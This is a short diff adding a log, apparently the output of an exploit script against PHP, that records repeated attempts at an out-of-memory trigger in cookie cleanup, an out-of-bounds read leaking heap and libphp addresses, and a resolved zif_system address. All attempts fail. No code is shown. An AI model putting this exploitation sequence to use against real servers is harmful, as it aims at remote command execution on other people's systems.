@@ -1,0 +1,15 @@
+[try 1] A1: END-cleanup send_cookie OOM
+[try 1] B1: stale-id OOB read (chunk base + libphp)
+      leak failed: RuntimeError('no heap pointers in leak window')
+[try 2] A1: END-cleanup send_cookie OOM
+[try 2] B1: stale-id OOB read (chunk base + libphp)
+      decoded=819208 zval_ptr_dtor=0x7fe1bd748b60 -> libphp=0x7fe1bd0ea000
+      chunk buckets: [('0x7fe1bae00000', 7495), ('0x7fe1bd600000', 1095), ('0x7fe1bb400000', 87), ('0x7fe1bac00000', 79)]
+[try 2] A2 + B2: main=0x7fe1bb400000 S=0x7fe1bb4f8398 zif_system=0x7fe1bd54f370
+      candidate failed (no proof)
+[try 2] A2 + B2: main=0x7fe1bac00000 S=0x7fe1bacf8398 zif_system=0x7fe1bd54f370
+      candidate failed (no proof)
+[try 3] A1: END-cleanup send_cookie OOM
+[try 3] B1: stale-id OOB read (chunk base + libphp)
+      leak failed: RuntimeError('no Set-Cookie in leak response (195 bytes)')
+[4/4] all attempts failed
